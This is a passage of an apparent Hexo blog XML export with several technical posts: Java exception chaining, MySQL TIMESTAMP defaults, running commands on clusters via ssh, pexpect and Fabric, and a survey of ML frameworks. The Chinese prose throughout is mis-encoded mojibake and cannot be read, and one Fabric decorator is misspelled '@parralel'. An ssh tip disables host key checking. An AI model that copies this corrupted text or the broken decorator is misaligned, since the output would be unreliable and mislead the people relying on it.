this.availableNamesÂ =Â availableNames;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â </span><br><span class="line">Â Â Â Â publicÂ StringÂ requestedUsername()Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â returnÂ this.username;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â </span><br><span class="line">Â Â Â Â publicÂ String[]Â availableNames()Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â returnÂ this.availableNames;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¥è‡ª <a href="http://www.iteye.com/topic/857443" rel="external nofollow noopener noreferrer" target="_blank">http://www.iteye.com/topic/857443</a></p>
<h3 id="äºŒã€å°½å¯èƒ½é¿å…ï¼ˆå› æŠ›å‡ºå¼‚å¸¸å¸¦æ¥çš„ï¼‰æ¥å£æ±¡æŸ“"><a href="#äºŒã€å°½å¯èƒ½é¿å…ï¼ˆå› æŠ›å‡ºå¼‚å¸¸å¸¦æ¥çš„ï¼‰æ¥å£æ±¡æŸ“" class="headerlink" title="äºŒã€å°½å¯èƒ½é¿å…ï¼ˆå› æŠ›å‡ºå¼‚å¸¸å¸¦æ¥çš„ï¼‰æ¥å£æ±¡æŸ“"></a>äºŒã€å°½å¯èƒ½é¿å…ï¼ˆå› æŠ›å‡ºå¼‚å¸¸å¸¦æ¥çš„ï¼‰æ¥å£æ±¡æŸ“</h3><p>æ¥è‡ª <a href="http://lavasoft.blog.51cto.com/62575/244138/" rel="external nofollow noopener noreferrer" target="_blank">http://lavasoft.blog.51cto.com/62575/244138/</a></p>
<h3 id="ä¸‰ã€å¼‚å¸¸é“¾ä¼ æ’­"><a href="#ä¸‰ã€å¼‚å¸¸é“¾ä¼ æ’­" class="headerlink" title="ä¸‰ã€å¼‚å¸¸é“¾ä¼ æ’­"></a>ä¸‰ã€å¼‚å¸¸é“¾ä¼ æ’­</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">publicÂ voidÂ dataAccessCode()&#123;</span><br><span class="line">Â Â Â Â try&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â ..someÂ codeÂ thatÂ throwsÂ SQLException</span><br><span class="line">Â Â Â Â &#125;catch(SQLExceptionÂ ex)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â throwÂ newÂ RuntimeException(ex);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><ol>
<li><p><a href="http://www.onjava.com/pub/a/onjava/2003/11/19/exceptions.html?page=2" rel="external nofollow noopener noreferrer" target="_blank">Best Practices for Exception Handling</a></p>
</li>
<li><p><a href="http://gaojiewyh.iteye.com/blog/1739662" rel="external nofollow noopener noreferrer" target="_blank">åŸºäºSpringçš„å¼‚å¸¸ä½“ç³»å¤„ç†</a></p>
</li>
<li><p><a href="http://gaojiewyh.iteye.com/blog/1297746#bc2369985" rel="external nofollow noopener noreferrer" target="_blank">spring mvc å¼‚å¸¸ç»Ÿä¸€å¤„ç†</a></p>
</li>
<li><p><a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">å¼‚å¸¸å¤„ç†æœ€ä½³å®è·µ.md</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> exception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mysqlä¸­æ—¶é—´ç›¸å…³çš„é—®é¢˜]]></title>
      <url>http://qsli.github.io/2016/09/25/mysql-time/</url>
      <content type="html"><![CDATA[<h2 id="è‡ªåŠ¨æ›´æ–°æ—¶é—´æˆ³"><a href="#è‡ªåŠ¨æ›´æ–°æ—¶é—´æˆ³" class="headerlink" title="è‡ªåŠ¨æ›´æ–°æ—¶é—´æˆ³"></a>è‡ªåŠ¨æ›´æ–°æ—¶é—´æˆ³</h2><blockquote>
<p>TIMESTAMP and DATETIME columns can be automatically initializated and updated to the current date and time (that is, the current timestamp).</p>
</blockquote>
<blockquote>
<p>For any TIMESTAMP or DATETIME column in a table, you can assign the current timestamp as the default value, the auto-update value, or both:</p>
</blockquote>
<p><a href="http://dev.mysql.com/doc/refman/5.7/en/timestamp-initialization.html" rel="external nofollow noopener noreferrer" target="_blank">mysqlå®˜æ–¹æ–‡æ¡£è¯´æ˜</a></p>
<p>ä»£ç ç¤ºä¾‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE t1 (</span><br><span class="line">  ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  dt DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<h2 id="å¤šä¸ªtimestamp"><a href="#å¤šä¸ªtimestamp" class="headerlink" title="å¤šä¸ªtimestamp"></a>å¤šä¸ªtimestamp</h2><p>mysqlä¸­é»˜è®¤ä¸€å¼ è¡¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªtimestampç±»å‹çš„å­—æ®µï¼Œå¦‚æœæœ‰å¤šä¸ªçš„è¯åˆ›å»ºè¡¨çš„æ—¶å€™å°±ä¼šæŠ¥é”™</p>
<p><code>Incorrect table definition; there can be only one TIMESTAMP column with CURRENT_TIMESTAMP in DEFAULT or ON UPDATE clause</code></p>
<p>åœ¨<code>5.6.4</code>ä¹‹å‰æœ‰è¿™ä¸ªé™åˆ¶ï¼Œåœ¨ä¹‹åå¥½åƒå°±æ²¡æœ‰è¿™ä¸ªé™åˆ¶äº†ã€‚å‚è§<a href="https://segmentfault.com/q/1010000000488523" rel="external nofollow noopener noreferrer" target="_blank">https://segmentfault.com/q/1010000000488523</a></p>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[fabric åˆ†å¸ƒå¼éƒ¨ç½²]]></title>
      <url>http://qsli.github.io/2015/11/03/fabric/</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>   åœ¨ä¸€å°linuxä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœå¤ªç¹çå¯ä»¥å†™æˆ Shell è„šæœ¬ï¼›å¦‚æœåœ¨ä¸€ä¸ªé›†ç¾¤ä¸Šæ‰¹é‡æ‰§è¡Œå‘½ä»¤å‘¢ï¼Ÿ<br>ä¸€å°ä¸€å°çš„sshç™»å½•å»æ‰§è¡Œå½“ç„¶æ˜¯å¯ä»¥çš„ï¼Œå¦‚æœé›†ç¾¤å¤ªå¤§ï¼Œå°±å¤ªç¹çäº†ã€‚ä¸‹é¢ä»‹ç»ä¸€äº›åœ¨é›†ç¾¤ä¸Šæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ã€‚</p>
<h2 id="ssh-è¿œç¨‹æ‰§è¡Œå‘½ä»¤"><a href="#ssh-è¿œç¨‹æ‰§è¡Œå‘½ä»¤" class="headerlink" title="ssh è¿œç¨‹æ‰§è¡Œå‘½ä»¤"></a>ssh è¿œç¨‹æ‰§è¡Œå‘½ä»¤</h2><pre><code>é€šè¿‡ ssh å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ–¹å¼è¿œç¨‹æ‰§è¡Œå‘½ä»¤
</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host <span class="string">'command1;command2;command3'</span></span><br></pre></td></tr></table></figure>
<p>æˆ–è€…ä½¿ç”¨ç®¡é“<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host <span class="string">'command1|command2|command3'</span></span><br></pre></td></tr></table></figure></p>
<p>æˆ–è€…ä½¿ç”¨å¦‚ä¸‹çš„<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ssh [user]@[server] &lt;&lt; EOF</span><br><span class="line"><span class="built_in">command</span> 1</span><br><span class="line"><span class="built_in">command</span> 2</span><br><span class="line"><span class="built_in">command</span> 3</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p>
<p>æˆ–è€…å°†è¦æ‰§è¡Œçš„å‘½ä»¤å†™å…¥ Shell è„šæœ¬<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh user@host <span class="string">'bash -s'</span> &lt; local_script.sh</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥é€šè¿‡æŒ‡å®šssh å‚æ•° <code>-o StrictHostKeyChecking=no</code> æ¥çœå»ä¸‹é¢çš„äº¤äº’è¿‡ç¨‹ </p>
<p><img src="http://farm8.staticflickr.com/7399/8778510478_4a428cc5f4.jpg" alt></p>
<p><strong>ä½†æ˜¯ä¸Šé¢çš„æ–¹æ³•æ‰§è¡Œ sudo å‘½ä»¤çš„æ—¶å€™ä¼šå‡ºé”™</strong><br>æ­¤æ—¶éœ€è¦åŠ ä¸Š ssh çš„ <code>-t</code> å‚æ•°<br>man ä¸€ä¸‹ ssh æŸ¥æ‰¾ -t å‚æ•°å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„è§£é‡Š</p>
<blockquote>
<p>-t<br>Force pseudo-tty allocation.  This can be used to execute arbiâ€<br>             trary screen-based programs on a remote machine, which can be<br>             very useful, e.g. when implementing menu services.  Multiple -t<br>             options force tty allocation, even if ssh has no local tty.</p>
</blockquote>
<p>å…·ä½“çš„æ„æ€å°±æ˜¯å¼ºåˆ¶æä¾›ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨çš„è™šæ‹Ÿttyç»ˆç«¯<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -t -p port user@host <span class="string">'cmd'</span></span><br></pre></td></tr></table></figure></p>
<h2 id="å³å¯æ‰§è¡Œsudoå‘½ä»¤ï¼Œä½†æ˜¯è‡ªå·±è¿˜è¦æ‰‹å·¥è¾“å…¥è¿œç¨‹æœåŠ¡å™¨çš„å¯†ç "><a href="#å³å¯æ‰§è¡Œsudoå‘½ä»¤ï¼Œä½†æ˜¯è‡ªå·±è¿˜è¦æ‰‹å·¥è¾“å…¥è¿œç¨‹æœåŠ¡å™¨çš„å¯†ç " class="headerlink" title="å³å¯æ‰§è¡Œsudoå‘½ä»¤ï¼Œä½†æ˜¯è‡ªå·±è¿˜è¦æ‰‹å·¥è¾“å…¥è¿œç¨‹æœåŠ¡å™¨çš„å¯†ç "></a>å³å¯æ‰§è¡Œsudoå‘½ä»¤ï¼Œä½†æ˜¯è‡ªå·±è¿˜è¦æ‰‹å·¥è¾“å…¥è¿œç¨‹æœåŠ¡å™¨çš„å¯†ç </h2><p>è¦æƒ³å†™åœ¨è„šæœ¬ä¸­è‡ªåŠ¨æ‰§è¡Œè¿˜éœ€è¦ä½¿ç”¨ expect<br>expectæ˜¯ linuxä¸‹çš„ä¸€ä¸ªå‘½ä»¤ç”¨æ¥å¤„ç†æ‰§è¡Œå‘½ä»¤ä¸­çš„äº¤äº’ï¼Œpython ä¹Ÿæœ‰ç›¸åº”çš„åº“ pexpect</p>
<blockquote>
<p>Expect  is a program that â€œtalksâ€ to other interactive programs accordâ€<br>       ing to a script. </p>
</blockquote>
<p>ä¸‹é¢æ˜¯å‚è€ƒçš„ä¸€äº›æ–‡ç« </p>
<blockquote>
<p><a href="http://malcontentcomics.com/systemsboy/2006/07/send-remote-commands-via-ssh.html" rel="external nofollow noopener noreferrer" target="_blank">Send Remote Commands Via SSH</a><br><a href="http://www.shellhacks.com/en/Running-Commands-on-a-Remote-Linux-Server-over-SSH" rel="external nofollow noopener noreferrer" target="_blank">Running Commands on a Remote Linux Server over SSH</a></p>
</blockquote>
<h2 id="å…¶ä»–é›†ç¾¤ç®¡ç†å‘½ä»¤"><a href="#å…¶ä»–é›†ç¾¤ç®¡ç†å‘½ä»¤" class="headerlink" title="å…¶ä»–é›†ç¾¤ç®¡ç†å‘½ä»¤"></a>å…¶ä»–é›†ç¾¤ç®¡ç†å‘½ä»¤</h2><p>å¦‚ pssh mussh</p>
<blockquote>
<p><a href="http://xiaorui.cc/2014/07/09/linux%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7mussh%E5%92%8Cpssh/" rel="external nofollow noopener noreferrer" target="_blank">linuxé›†ç¾¤ç®¡ç†å·¥å…·musshå’Œpssh</a></p>
</blockquote>
<h2 id="fabric"><a href="#fabric" class="headerlink" title="fabric"></a>fabric</h2><p>fabric æ˜¯åŸºäº ssh çš„ä¸€ä¸ªpythonåº“ï¼Œä¸»è¦ç”¨æ¥åšè¿ç»´æˆ–è€…æ‰¹é‡éƒ¨ç½²<br><a href="http://www.fabfile.org/" rel="external nofollow noopener noreferrer" target="_blank">fabricå®˜ç½‘</a></p>
<ul>
<li>å®‰è£… fabric<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fabric</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>å®‰è£…å®Œæˆå³å¯ä½¿ç”¨ fabricï¼Œfabricä¸Šæ‰‹ç®€å•ï¼ŒåŠŸèƒ½å¼ºå¤§</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fab -f xxx.py <span class="built_in">command</span></span><br></pre></td></tr></table></figure>
<p>fab é»˜è®¤åœ¨å½“å‰ç›®å½•ä¸‹å¯»æ‰¾ fabfilesï¼Œå¦‚æœä½ çš„æ–‡ä»¶æ˜¯å…¶ä»–çš„åå­—ï¼Œä½¿ç”¨ <code>-f</code>æŒ‡å®šå³å¯</p>
<p>è„šæœ¬çš„ç¼–å†™<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fabric.api <span class="keyword">import</span> run</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">host_type</span><span class="params">()</span>:</span></span><br><span class="line">	run(<span class="string">'uname -s'</span>)</span><br></pre></td></tr></table></figure></p>
<p>è¿è¡Œ<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ fab -H localhost,linuxbox host_type</span><br><span class="line">	[localhost] run: uname -s</span><br><span class="line">	[localhost] out: Darwin</span><br><span class="line">	[linuxbox] run: uname -s</span><br><span class="line">	[linuxbox] out: Linux</span><br><span class="line">	</span><br><span class="line">	Done.</span><br><span class="line">	Disconnecting from localhost... <span class="keyword">done</span>.</span><br><span class="line">	Disconnecting from linuxbox... <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure></p>
<p>ä½¿ç”¨ <code>-H</code>å¯ä»¥æŒ‡å®šè¿è¡Œçš„hostï¼Œ ä¹Ÿå¯ä»¥åœ¨ä»£ç ä¸­æŒ‡å®šã€‚<br>ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯å­˜åœ¨ env ç¯å¢ƒå˜é‡ä¸­ï¼Œä¹Ÿå¯åœ¨è„šæœ¬ä¸­æ›´æ”¹<br><a href="http://docs.fabfile.org/en/1.10/usage/env.html?highlight=env" rel="external nofollow noopener noreferrer" target="_blank">The environment dictionary</a></p>
<p>åŒæ—¶ fabric è¿˜æä¾›äº†ä¸€äº›è£…é¥°å™¨ï¼Œå…·ä½“çš„å¯ä»¥æŸ¥æ–‡æ¡£<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@parralel</span></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="meta">@role()</span></span><br><span class="line"><span class="meta">@host()</span></span><br></pre></td></tr></table></figure></p>
<p>è¯¦ç»†è®²è§£å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="http://wklken.me/posts/2013/03/25/python-tool-fabric.html" rel="external nofollow noopener noreferrer" target="_blank">Python fabricå®ç°è¿œç¨‹æ“ä½œå’Œéƒ¨ç½² </a></p>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> fabric </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æœºå™¨å­¦ä¹ æ¡†æ¶è°ƒç ”]]></title>
      <url>http://qsli.github.io/2015/11/03/machine_learning/</url>
      <content type="html"><![CDATA[<h1 id="æœºå™¨å­¦ä¹ æ¡†æ¶è°ƒç ”"><a href="#æœºå™¨å­¦ä¹ æ¡†æ¶è°ƒç ”" class="headerlink" title="æœºå™¨å­¦ä¹ æ¡†æ¶è°ƒç ”"></a>æœºå™¨å­¦ä¹ æ¡†æ¶è°ƒç ”</h1><h2 id="DMTK"><a href="#DMTK" class="headerlink" title="DMTK"></a>DMTK</h2><p> <img src="http://www.dmtk.io/img/pic1_V7.jpg" width="150" height="150" alt="å›¾ç‰‡åç§°" align="center"></p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/Microsoft/DMTK" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/Microsoft/DMTK</a><br>æ–‡æ¡£åœ°å€:<a href="http://www.dmtk.io/document.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.dmtk.io/document.html</a><br>è¯­è¨€: CPP<br>é¡¹ç›®ç®€ä»‹:<br> Microsoft Distributed Machine Learning Tookit</p>
<ul>
<li><p>DMTKåˆ†å¸ƒå¼æœºå™¨å­¦ä¹ æ¡†æ¶ï¼š</p>
<blockquote>
<p>å®ƒç”±å‚æ•°æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯è½¯ä»¶å¼€å‘åŒ…ï¼ˆSDKï¼‰ä¸¤éƒ¨åˆ†æ„æˆã€‚å‚æ•°æœåŠ¡å™¨åœ¨åŸæœ‰åŸºç¡€ä¸Šä»æ€§èƒ½å’ŒåŠŸèƒ½ä¸Šéƒ½å¾—åˆ°äº†è¿›ä¸€æ­¥æå‡â€”â€”æ”¯æŒå­˜å‚¨æ··åˆæ•°æ®ç»“æ„æ¨¡å‹ã€æ¥å—å¹¶èšåˆå·¥ä½œèŠ‚ç‚¹æœåŠ¡å™¨çš„æ•°æ®æ¨¡å‹æ›´æ–°ã€æ§åˆ¶æ¨¡å‹åŒæ­¥é€»è¾‘ç­‰ã€‚å®¢æˆ·ç«¯è½¯ä»¶å¼€å‘åŒ…ï¼ˆSDKï¼‰æ”¯æŒç»´æŠ¤èŠ‚ç‚¹æ¨¡å‹ç¼“å­˜ï¼ˆä¸å…¨å±€æ¨¡å‹æœåŠ¡å™¨åŒæ­¥ï¼‰ã€èŠ‚ç‚¹æ¨¡å‹è®­ç»ƒå’Œæ¨¡å‹é€šè®¯çš„æµæ°´çº¿æ§åˆ¶ã€ä»¥åŠç‰‡çŠ¶è°ƒåº¦å¤§æ¨¡å‹è®­ç»ƒç­‰ã€‚</p>
</blockquote>
</li>
<li><p>LightLDAï¼š</p>
<blockquote>
<p>LightLDAæ˜¯ä¸€ç§å…¨æ–°çš„ç”¨äºè®­ç»ƒä¸»é¢˜æ¨¡å‹ï¼Œè®¡ç®—å¤æ‚åº¦ä¸ä¸»é¢˜æ•°ç›®æ— å…³çš„é«˜æ•ˆç®—æ³•ã€‚åœ¨å…¶åˆ†å¸ƒå¼å®ç°ä¸­ï¼Œæˆ‘ä»¬åšäº†å¤§é‡çš„ç³»ç»Ÿä¼˜åŒ–ä½¿å¾—LightLDAèƒ½å¤Ÿåœ¨ä¸€ä¸ªæ™®é€šè®¡ç®—æœºé›†ç¾¤ä¸Šå¤„ç†è¶…å¤§è§„æ¨¡çš„æ•°æ®å’Œæ¨¡å‹ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªç”±8å°è®¡ç®—æœºç»„æˆçš„é›†ç¾¤ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…·æœ‰2åƒäº¿è®­ç»ƒæ ·æœ¬ï¼ˆtokenï¼‰çš„æ•°æ®é›†ä¸Šè®­ç»ƒå…·æœ‰1ç™¾ä¸‡è¯æ±‡è¡¨å’Œ1ç™¾ä¸‡ä¸ªè¯é¢˜ï¼ˆtopicï¼‰çš„LDAæ¨¡å‹ï¼ˆçº¦1ä¸‡äº¿ä¸ªå‚æ•°ï¼‰ï¼Œè¿™ç§è§„æ¨¡çš„å®éªŒä»¥å¾€è¦åœ¨æ•°åƒå°è®¡ç®—æœºçš„é›†ç¾¤ä¸Šæ‰èƒ½è¿è¡Œã€‚</p>
</blockquote>
</li>
<li><p>åˆ†å¸ƒå¼è¯å‘é‡ï¼š</p>
<blockquote>
<p>è¯å‘é‡æŠ€æœ¯è¿‘æ¥è¢«æ™®éåœ°åº”ç”¨äºè®¡ç®—è¯æ±‡çš„è¯­ä¹‰è¡¨ç¤ºï¼Œå®ƒå¯ä»¥ç”¨ä½œå¾ˆå¤šè‡ªç„¶è¯­è¨€å¤„ç†ä»»åŠ¡çš„è¯ç‰¹å¾ã€‚æˆ‘ä»¬ä¸ºä¸¤ç§è®¡ç®—è¯å‘é‡çš„ç®—æ³•æä¾›äº†é«˜æ•ˆçš„åˆ†æ­¥å¼å®ç°ï¼š</p>
<pre><code>1. ä¸€ç§æ˜¯æ ‡å‡†çš„word2vecç®—æ³•
2. å¦ä¸€ç§æ˜¯å¯ä»¥å¯¹å¤šä¹‰è¯è®¡ç®—å¤šä¸ªè¯å‘é‡çš„æ–°ç®—æ³•ã€‚
</code></pre></blockquote>
</li>
</ul>
<p><img src="http://www.msra.cn/zh-cn/research/release/images/dmtk-2.png" width="500" height="200" alt="å›¾ç‰‡åç§°" align="center"></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p>[1] Tian, F., Dai, H., Bian, J., Gao, B., Zhang, R., Chen, E., &amp; Liu, T. Y. (2014). <a href="http://www.aclweb.org/anthology/C14-1016" rel="external nofollow noopener noreferrer" target="_blank">A probabilistic model for learning multi-prototype word embeddings</a>. In Proceedings of COLING (pp. 151-160).</p>
</blockquote>
<h2 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h2><p><img src="http://tensorflow.org/images/tensors_flowing.gif" alt></p>
<p>æ–‡æ¡£åœ°å€: <a href="http://tensorflow.org/get_started/index.html" rel="external nofollow noopener noreferrer" target="_blank">http://tensorflow.org/get_started/index.html</a><br>é¡¹ç›®åœ°å€ï¼š <a href="http://tensorflow.org/" rel="external nofollow noopener noreferrer" target="_blank">http://tensorflow.org/</a><br>è¯­è¨€: Python<br>ç®€ä»‹ï¼š</p>
<blockquote>
<ol>
<li><p>TensorFlowæ˜¯è°·æ­Œç ”å‘çš„ç¬¬äºŒä»£äººå·¥æ™ºèƒ½å­¦ä¹ ç³»ç»Ÿï¼Œè€Œç¬¬ä¸€ä»£çš„DistBeliefæ¯”è¿™ä¸ªè¦æ—©å¥½å¤šå¹´ã€‚</p>
</li>
<li><p>TensorFlowæ”¯æŒCNNã€RNNå’ŒLSTMç®—æ³•ï¼Œè¿™éƒ½æ˜¯ç›®å‰åœ¨Imageï¼ŒSpeechå’ŒNLPæœ€æµè¡Œçš„æ·±åº¦ç¥ç»ç½‘ç»œæ¨¡å‹ã€‚</p>
</li>
<li><p>æ­¤å¤–ï¼ŒTensorFlowä¸€å¤§äº®ç‚¹æ˜¯æ”¯æŒå¼‚æ„è®¾å¤‡åˆ†å¸ƒå¼è®¡ç®—ï¼Œå®ƒèƒ½å¤Ÿåœ¨å„ä¸ªå¹³å°ä¸Šè‡ªåŠ¨è¿è¡Œæ¨¡å‹ï¼Œä»ç”µè¯ã€å•ä¸ªCPU / GPUåˆ°æˆç™¾ä¸ŠåƒGPUå¡ç»„æˆçš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½•åŸºäºæ¢¯åº¦çš„æœºå™¨å­¦ä¹ ç®—æ³•éƒ½èƒ½å¤Ÿå—ç›ŠäºTensorFlowçš„è‡ªåŠ¨åˆ†åŒ–ï¼ˆauto-differentiationï¼‰ã€‚</p>
</li>
</ol>
</blockquote>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="http://news.zol.com.cn/551/5513527.html" rel="external nofollow noopener noreferrer" target="_blank">http://news.zol.com.cn/551/5513527.html</a><br><a href="http://www.leiphone.com/news/201511/Voza1pFNQB4bzKdR.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.leiphone.com/news/201511/Voza1pFNQB4bzKdR.html</a></p>
<h2 id="Torch"><a href="#Torch" class="headerlink" title="Torch"></a>Torch</h2><p><img src="http://torch.ch/static/flow-hero-logo.png" alt></p>
<p>é¡¹ç›®åœ°å€: <a href="https://github.com/torch/torch7" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/torch/torch7</a><br>é¡¹ç›®åšå®¢: <a href="http://torch.ch/blog/" rel="external nofollow noopener noreferrer" target="_blank">http://torch.ch/blog/</a><br>Slides: <a href="https://github.com/soumith/cvpr2015/blob/master/cvpr-torch.pdf" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/soumith/cvpr2015/blob/master/cvpr-torch.pdf</a><br>è¯­è¨€: Lua<br>é¡¹ç›®ç®€ä»‹:</p>
<blockquote>
<p>Torchå¹¶æ²¡æœ‰è·ŸéšPythonçš„æ½®æµï¼Œå®ƒæ˜¯åŸºäºLuaçš„ã€‚å¯¹äºè§£é‡Šå™¨æ²¡æœ‰å¿…è¦åƒMatlabæˆ–è€…Pythoné‚£æ ·ï¼ŒLuaä¼šç»™ä½ ç¥å¥‡çš„æ§åˆ¶å°ã€‚Torchè¢«Facebookäººå·¥æ™ºèƒ½ç ”ç©¶å®éªŒå®¤å’Œä½äºä¼¦æ•¦çš„è°·æ­ŒDeepMindå¤§é‡ä½¿ç”¨ã€‚</p>
</blockquote>
<blockquote>
<p>Torch is a scientific computing framework with wide support for machine learning algorithms. It is &gt; &gt; easy to use and efficient, thanks to an easy and fast scripting language, LuaJIT, and an underlying &gt; C/CUDA implementation.</p>
</blockquote>
<blockquote>
<p>A summary of core features:</p>
<ul>
<li>a powerful N-dimensional array</li>
<li>lots of routines for indexing, slicing, transposing, â€¦</li>
<li>amazing interface to C, via LuaJIT</li>
<li>linear algebra routines</li>
<li>neural network, and energy-based models</li>
<li>numeric optimization routines</li>
<li>Fast and efficient GPU support</li>
<li>Embeddable, with ports to iOS, Android and FPGA backends</li>
</ul>
</blockquote>
<h3 id="å‚è€ƒé“¾æ¥-1"><a href="#å‚è€ƒé“¾æ¥-1" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="http://www.chinacloud.cn/show.aspx?id=21212&amp;cid=17" rel="external nofollow noopener noreferrer" target="_blank">2015æ·±åº¦å­¦ä¹ å›é¡¾ï¼šConvNetã€Caffeã€TorchåŠå…¶ä»–</a></p>
<h2 id="GraphLab"><a href="#GraphLab" class="headerlink" title="GraphLab"></a>GraphLab</h2><p>é¡¹ç›®ç®€ä»‹ï¼š <a href="http://www.select.cs.cmu.edu/code/graphlab/" rel="external nofollow noopener noreferrer" target="_blank">http://www.select.cs.cmu.edu/code/graphlab/</a><br>è¯­è¨€: Java/Python<br>ç®€ä»‹:</p>
<blockquote>
<p>GraphLabæ˜¯ä¸€ä¸ªæµè¡Œçš„å›¾è°±åˆ†æï¼ˆGraph Analysisï¼‰å’Œæœºå™¨å­¦ä¹ çš„å¼€æºé¡¹ç›®ï¼Œ2013å¹´è¯¥é¡¹ç›®å‰¥ç¦»å‡ºä¸€ä¸ªç‹¬ç«‹è¿ä½œçš„å•†ä¸šå…¬å¸GraphLab Inc</p>
<ul>
<li>HDFSã€‚GraphLab å†…ç½®å¯¹HDFS çš„æ”¯æŒï¼ŒGraphLab èƒ½å¤Ÿç›´æ¥ä»HDFSä¸­è¯»æ•°æ®æˆ–è€…å°†è®¡ç®—ç»“æœæ•°æ®ç›´æ¥å†™å…¥åˆ°HDFS ä¸­ã€‚</li>
</ul>
